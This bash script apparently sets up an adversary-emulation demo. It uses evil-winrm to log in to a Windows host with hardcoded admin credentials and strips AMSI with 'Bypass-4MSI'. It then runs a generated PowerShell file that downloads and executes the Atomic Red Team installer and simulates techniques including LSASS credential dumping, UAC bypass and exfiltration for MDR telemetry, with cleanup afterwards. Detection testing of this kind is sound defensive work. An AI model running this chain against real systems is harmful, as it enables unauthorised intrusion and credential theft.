#!/bin/bash

# ==============================================================================
# Target Variables - UPDATE THESE FOR YOUR DEMO ENVIRONMENT
# ==============================================================================
TARGET_IP="192.168.1.100"
USERNAME="Administrator"
PASSWORD="YourStrongPassword123!"

echo "[*] Generating Atomic Red Team PowerShell Payload..."

# ==============================================================================
# 1. Generate the PowerShell Payload (run_art.ps1)
# ==============================================================================
cat << 'EOF' > run_art.ps1
# Set TLS 1.2 for downloading ART
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

Write-Host "[+] Installing Atomic Red Team..." -ForegroundColor Green
if (!(Test-Path "C:\AtomicRedTeam")) {
    IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)
    Install-AtomicRedTeam -getAtomics -Force
}
Import-Module "C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1" -Force

# Define one technique per major MITRE Tactic
# Updated Defense Evasion to T1218.010 (Regsvr32 Bypass)
$techniques = @(
    "T1059.001", # Execution (PowerShell)
    "T1053.005", # Persistence (Scheduled Task)
    "T1548.002", # Privilege Escalation (Bypass UAC)
    "T1218.010", # Defense Evasion (System Binary Proxy Execution: Regsvr32)
    "T1003.001", # Credential Access (LSASS Memory Dumping)
    "T1082",     # Discovery (System Information Discovery)
    "T1021.001", # Lateral Movement (Remote Desktop Protocol)
    "T1119",     # Collection (Automated Collection)
    "T1071.001", # Command and Control (Web Protocols)
    "T1048",     # Exfiltration (Exfiltration Over Alternative Protocol)
    "T1489"      # Impact (Service Stop)
)

Write-Host "[+] Executing Simulations..." -ForegroundColor Green
foreach ($t in $techniques) {
    Write-Host "`n[!] Simulating Tactic Technique: $t" -ForegroundColor Yellow
    Invoke-AtomicTest $t -GetPrereqs -ErrorAction SilentlyContinue
    Invoke-AtomicTest $t -ExecutionLogPath "C:\Users\Public\art_log.txt"
}

Write-Host "`n[+] Simulations complete. Pausing 20s for MDR telemetry..." -ForegroundColor Cyan
Start-Sleep -Seconds 20

Write-Host "[+] Cleaning up simulated artifacts..." -ForegroundColor Green
foreach ($t in $techniques) {
    Write-Host "--> Cleaning up $t" -ForegroundColor Yellow
    Invoke-AtomicTest $t -Cleanup -ErrorAction SilentlyContinue
}

Write-Host "[+] Uninstalling Atomic Red Team..." -ForegroundColor Green
Remove-Item -Recurse -Force "C:\AtomicRedTeam" -ErrorAction SilentlyContinue
Remove-Item -Force "C:\Users\Public\art_log.txt" -ErrorAction SilentlyContinue

Write-Host "[+] Demonstration Complete!" -ForegroundColor Green
EOF

echo "[*] Payload generated. Launching evil-winrm via expect..."

# ==============================================================================
# 2. Use 'expect' to automate the evil-winrm session
# ==============================================================================
# The -s . flag mounts your current Linux directory to the remote Windows machine
# as a virtual drive, allowing the PS1 script to be run directly.

expect -c "
set timeout -1
spawn evil-winrm -i $TARGET_IP -u \"$USERNAME\" -p \"$PASSWORD\" -s .

expect \"*PS*\"
# evil-winrm's built-in command to strip AMSI from the current process
send \"Bypass-4MSI\r\"

expect \"*PS*\"
# Execute the script from the mapped scripts folder
send \"./run_art.ps1\r\"

expect \"*Demonstration Complete!*\"
send \"exit\r\"
expect eof
"

echo "[*] Cleaning up local payload file..."
rm run_art.ps1
